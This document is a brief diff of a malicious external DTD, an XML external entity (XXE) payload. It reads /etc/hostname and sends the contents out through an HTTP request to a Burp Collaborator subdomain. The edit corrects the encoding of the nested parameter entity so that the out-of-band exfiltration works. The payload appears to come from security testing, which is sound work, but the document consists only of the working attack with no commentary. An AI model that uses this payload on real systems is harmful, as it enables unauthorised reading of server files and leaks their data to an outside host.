@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://mb1bv722baro4bmeyy0bzluxyo4es3.burpcollaborator.net/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://mb1bv722baro4bmeyy0bzluxyo4es3.burpcollaborator.net/?x=&#x25file;'>">
 %eval;
 %exfil;
